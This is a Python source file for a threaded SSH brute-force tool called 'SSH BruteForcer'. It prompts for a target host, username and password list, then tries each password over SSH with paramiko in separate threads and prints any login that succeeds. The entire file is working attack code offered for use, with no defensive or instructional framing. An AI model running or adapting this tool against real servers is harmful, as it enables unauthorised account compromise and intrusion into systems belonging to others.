import paramiko
import sys
import os
import socket
import termcolor
import time
import threading

stop_flag = 0


def ssh_connect(password):
    global stop_flag
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, port=22, username=username, password=password)
        stop_flag = 1
        print(termcolor.colored(
            ('[+] Found Password: ' + password + ', For account: ' + username + ', On Host: ' + host), 'green'))
    except:
        print(termcolor.colored(('[-] Incorrect Login: ' + password), 'red'))
    ssh.close()


print(termcolor.colored(("""
         ____ ____  _   _ ____             _       _____                        
        / ___/ ___|| | | | __ ) _ __ _   _| |_ ___|  ___|__  _ __ ___ ___ _ __  
        \___ \___ \| |_| |  _ \| '__| | | | __/ _ \ |_ / _ \| '__/ __/ _ \ '__| 
         ___) |__) |  _  | |_) | |  | |_| | ||  __/  _| (_) | | | (_|  __/ |    
        |____/____/|_| |_|____/|_|   \__,_|\__\___|_|  \___/|_|  \___\___|_|    

                        | Coded By: Muhammad Zaki - @itismuzak |                                                                               
"""), 'yellow'))

host = input("[+] Enter the Target's Host : ")
username = input("[+] Enter the Target's username : ")
input_file = input("[+] Enter the name of passwords File : ")

print('\n')

if os.path.exists(input_file) == False:
    print(termcolor.colored(
        ('[!!] That File Doesnt Exist. *Must be in the same Directory*'), 'red'))
    sys.exit(1)

print(termcolor.colored(("[+] Starting The Threaded SSH Bruteforce.... "), 'magenta'))

with open(input_file, 'r') as file:
    for line in file.readlines():
        if stop_flag == 1:
            t.join()
            exit()
        password = line.strip()
        t = threading.Thread(target=ssh_connect, args=(password,))
        t.start()
        time.sleep(0.5)
